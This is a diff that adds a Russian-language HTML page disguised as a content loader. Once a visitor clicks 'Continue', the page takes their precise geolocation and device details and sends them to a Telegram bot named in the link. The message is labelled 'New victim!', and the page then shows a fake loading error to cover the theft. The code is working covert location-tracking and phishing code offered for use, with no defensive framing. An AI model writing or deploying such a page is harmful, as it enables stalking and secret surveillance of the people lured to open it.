@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Загрузка...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #000;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .message {
+            text-align: center;
+            opacity: 0.8;
+            font-size: 14px;
+            margin-bottom: 30px;
+            padding: 0 20px;
+        }
+        .btn {
+            background: #fff;
+            color: #000;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: transform 0.2s;
+        }
+        .btn:active { transform: scale(0.95); }
+        .hidden { display: none !important; }
+        .error {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div id="step1">
+        <div class="loader"></div>
+        <div class="message">
+            Загрузка контента...<br>
+            <small style="opacity: 0.6;">Нажмите для продолжения</small>
+        </div>
+        <button class="btn" onclick="startTracking()">Продолжить</button>
+    </div>
+
+    <div id="step2" class="hidden">
+        <div class="loader"></div>
+        <div class="message">Определение местоположения...</div>
+    </div>
+
+    <div id="error" class="error">
+        <h2>⚠️</h2>
+        <p>Ошибка загрузки</p>
+        <small style="opacity: 0.6;">Попробуйте позже</small>
+    </div>
+
+    <script>
+        // Get params from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const token = urlParams.get('token');
+        const chatId = urlParams.get('chat');
+        const victimId = urlParams.get('id') || 'victim_' + Math.random().toString(36).substr(2, 9);
+
+        if (!token || !chatId) {
+            document.body.innerHTML = '<div style="color:white; padding:20px; text-align:center;">Ошибка: неверная ссылка</div>';
+        }
+
+        async function startTracking() {
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+
+            if (!navigator.geolocation) {
+                await sendToTelegram(null, null, 'Geolocation not supported');
+                showError();
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+
+                    await sendToTelegram(lat, lon, accuracy);
+                    setTimeout(showError, 1500);
+                },
+                async (error) => {
+                    let errorMsg = 'Unknown error';
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED: errorMsg = 'Доступ запрещен'; break;
+                        case error.POSITION_UNAVAILABLE: errorMsg = 'Позиция недоступна'; break;
+                        case error.TIMEOUT: errorMsg = 'Таймаут'; break;
+                    }
+                    await sendToTelegram(null, null, errorMsg);
+                    showError();
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        async function sendToTelegram(lat, lon, accuracy) {
+            try {
+                const deviceInfo = `🎯 <b>Новая жертва!</b>
+
+🆔 ID: <code>${victimId}</code>
+📱 Устройство: ${navigator.platform}
+🌐 Язык: ${navigator.language}
+📏 Экран: ${screen.width}x${screen.height}
+🕐 Время: ${new Date().toLocaleString('ru-RU')}`;
+
+                let locationText = '';
+                if (lat && lon) {
+                    locationText = `
+
+📍 <b>ГЕОЛОКАЦИЯ:</b>
+Широта: <code>${lat.toFixed(6)}</code>
+Долгота: <code>${lon.toFixed(6)}</code>
+Точность: ${accuracy} метров
+
+🗺 <b>КАРТЫ:</b>
+<a href="https://www.google.com/maps?q=${lat},${lon}">Google Maps</a>
+<a href="https://yandex.ru/maps/?pt=${lon},${lat}&z=18&l=map">Яндекс Карты</a>`;
+                } else {
+                    locationText = `
+
+❌ <b>Геолокация не получена:</b> ${accuracy}`;
+                }
+
+                // Send text message
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: deviceInfo + locationText,
+                        parse_mode: 'HTML',
+                        disable_web_page_preview: true
+                    })
+                });
+
+                // If we have coordinates, also send location object
+                if (lat && lon) {
+                    await fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            latitude: lat,
+                            longitude: lon
+                        })
+                    });
+                }
+
+            } catch (e) {
+                console.error('Error:', e);
+            }
+        }
+
+        function showError() {
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('error').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
